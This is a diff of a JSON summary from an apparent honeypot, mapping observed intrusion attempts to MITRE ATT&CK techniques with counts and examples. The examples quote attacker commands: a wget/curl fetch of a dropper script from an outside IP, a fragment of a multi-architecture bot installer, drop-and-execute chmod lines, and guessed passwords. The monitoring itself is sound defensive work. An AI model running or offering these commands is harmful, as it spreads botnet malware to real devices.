@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-27 02:02:52",
+  "generated": "2026-09-27 03:00:08",
   "totals": {
-    "commands": 397,
-    "login_failed": 398,
-    "login_success": 34,
-    "sessions": 443
+    "commands": 638,
+    "login_failed": 959,
+    "login_success": 55,
+    "sessions": 1051
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 398,
+      "count": 959,
       "examples": [
         "mongo / 1qaz@WSX",
         "gitlab-runner / qwerty",
@@ -21,14 +21,14 @@
         "admin / admin"
       ],
       "first": "2026-09-27T00:00:14.493551Z",
-      "last": "2026-09-27T02:02:48.394269Z",
-      "unique_ips": 12
+      "last": "2026-09-27T03:00:00.769560Z",
+      "unique_ips": 15
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 180,
+      "count": 289,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/;",
         ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/;",
@@ -37,22 +37,39 @@
         ">/dev/shm/.f && chmod 777 /dev/shm/.f && /dev/shm/.f && cd /dev/shm/;"
       ],
       "first": "2026-09-27T00:03:01.683614Z",
-      "last": "2026-09-27T01:49:14.750586Z",
-      "unique_ips": 3
+      "last": "2026-09-27T02:59:02.952101Z",
+      "unique_ips": 7
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 34,
+      "count": 55,
       "examples": [
         "root / root",
         "enable / linuxshell",
-        "root / "
+        "root / ",
+        "test / test@123",
+        "root / 1234"
       ],
       "first": "2026-09-27T00:02:58.504576Z",
-      "last": "2026-09-27T01:55:34.971174Z",
-      "unique_ips": 5
+      "last": "2026-09-27T02:59:00.746434Z",
+      "unique_ips": 11
+    },
+    {
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 8,
+      "examples": [
+        "cd /tmp;rm -rf wget.sh; wget http://202.110.70.60:800/wget.sh; busybox wget http://202.110.70.60:800/wget.sh; curl -O ht",
+        "http://202.110.70.60:800/wget.sh",
+        "#!/bin/sh\ngroup=$1\nserver=\"202.110.70.60:800\"\nbins=\"alya.arc alya.armv6l alya.i586 alya.mips alya.sh4 alya.armv4l alya.a",
+        "http://202.110.70.60:800/alya.arc alya.armv6l alya.i586 alya.mips alya.sh4 alya.armv4l alya.armv7l alya.i686 alya.mipsel"
+      ],
+      "first": "2026-09-27T02:39:43.674112Z",
+      "last": "2026-09-27T02:39:54.145570Z",
+      "unique_ips": 1
     },
     {
       "id": "T1083",
@@ -65,36 +82,80 @@
       "first": "2026-09-27T00:07:42.916360Z",
       "last": "2026-09-27T00:07:43.952410Z",
       "unique_ips": 1
+    },
+    {
+      "id": "T1070.004",
+      "name": "Indicator Removal: File Deletion",
+      "tactic": "Defense Evasion",
+      "count": 1,
+      "examples": [
+        "#!/bin/sh\ngroup=$1\nserver=\"202.110.70.60:800\"\nbins=\"alya.arc alya.armv6l alya.i586 alya.mips alya.sh4 alya.armv4l alya.a"
+      ],
+      "first": "2026-09-27T02:39:49.903645Z",
+      "last": "2026-09-27T02:39:49.903645Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1082",
+      "name": "System Information Discovery",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "uname -s -v -n -r -m"
+      ],
+      "first": "2026-09-27T02:21:33.158204Z",
+      "last": "2026-09-27T02:21:33.158204Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1489",
+      "name": "Service Stop",
+      "tactic": "Impact",
+      "count": 1,
+      "examples": [
+        "#!/bin/sh\ngroup=$1\nserver=\"202.110.70.60:800\"\nbins=\"alya.arc alya.armv6l alya.i586 alya.mips alya.sh4 alya.armv4l alya.a"
+      ],
+      "first": "2026-09-27T02:39:49.903645Z",
+      "last": "2026-09-27T02:39:49.903645Z",
+      "unique_ips": 1
     }
   ],
   "unmapped": [
     [
       "/bin/busybox HISILICON",
-      45
+      72
     ],
     [
       "system",
-      33
+      51
     ],
     [
       "sh",
-      32
+      50
     ],
     [
       "shell",
-      30
+      48
     ],
     [
       "enable",
-      30
+      48
     ],
     [
       "ping; sh",
-      30
+      48
     ],
     [
       "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
-      15
+      24
+    ],
+    [
+      "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>404 Not Found</title>\n</head><body>\n<h1>Not Found",
+      3
+    ],
+    [
+      "hostname",
+      1
     ]
   ]
 }
